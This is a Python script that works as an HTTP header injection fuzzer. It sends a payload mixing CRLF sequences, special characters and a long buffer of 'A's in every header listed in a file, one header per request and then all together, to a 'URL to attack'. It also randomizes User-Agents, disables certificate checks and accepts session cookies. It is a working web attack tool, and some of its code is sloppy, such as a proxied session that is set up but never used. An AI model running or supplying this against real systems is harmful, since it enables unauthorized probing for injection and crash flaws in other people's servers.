#!/usr/bin/env python3
import argparse
from http.cookies import SimpleCookie
import json
import random
import requests
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

_proxy = 'http://127.0.0.1:8080'
dir = os.path.dirname(os.path.realpath(__file__))
headerPayload = "%0D%0A`~!@#$%^&*()_+{}=-[]:;'\"\\?/><.,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

def get_random_useragent():
    """Returns a randomly chosen User-Agent string."""
    win_edge = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246'
    win_firefox = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/43.0'
    win_chrome = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
    lin_firefox = 'Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/42.0'
    mac_chrome = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.38 Safari/537.36'
    ie = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)'
    ua_dict = {
        1: win_edge,
        2: win_firefox,
        3: win_chrome,
        4: lin_firefox,
        5: mac_chrome,
        6: ie
    }
    rand_num = random.randrange(1, (len(ua_dict) + 1))
    return ua_dict[rand_num]

def headersList():
    items = []
    with open(dir + "/headers.txt", "r") as f:
        for line in f:
            items.append(line.rstrip('\n'))
    return items

def injectHeaders(url, cookies):
    _headers = headersList()
    print("\nPayload to be passed:\n" + headerPayload)
    s = requests.Session()
    user_agent = get_random_useragent()
    s.headers['User-Agent'] = user_agent
    s.proxies['http'] = _proxy
    s.proxies['https'] = _proxy
    print("\nSend Initial Request - TODO use for comparison\n")
    r1 = requests.get(url, cookies=cookies, verify=False)
    print("\nSend 1 header in each request.\n")
    for h in _headers:
        hdrs = { h : headerPayload }
        r1 = requests.get(url, cookies=cookies,headers=hdrs, verify=False)
    
    print("\nSend 1 massive request\n")
    allheaders = {}
    allheaders["hack"]="me"
    for h in _headers: 
        s = h.lower()
        if s == "host":
            print("Ignoring host header")
        elif s == "content-length":
            print("Ignorning content-length header")
        else:
            allheaders[h]=headerPayload
    
    r1 = requests.get(url, cookies=cookies, headers=allheaders, verify=False)
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-pr", "--proxy", 
                        help="Specify a proxy to use (-p 127.0.0.1:8080)")
    parser.add_argument("-u", "--url",
                        help="URL to attack")
    parser.add_argument("-c", "--cookies",
                        help="Pass cookies to use")
    parser.add_argument("-p", "--payload",
                        help="Use your own payload instead of the default")
    args = parser.parse_args()
    cookies=''
    if not args.url:
        parser.print_help()
        print("\n[-] Please specify a URL (-u) \n")
        exit()
    else:
        url = args.url
    if args.cookies:
        cookie = SimpleCookie()
        cookie.load(args.cookies)
        cookies = {}
        for key, morsel in cookie.items():
            cookies[key] = morsel.value

    if args.payload:
        headerPayload = args.payload
    if args.proxy:
        _proxy = args.proxy
injectHeaders(url,cookies)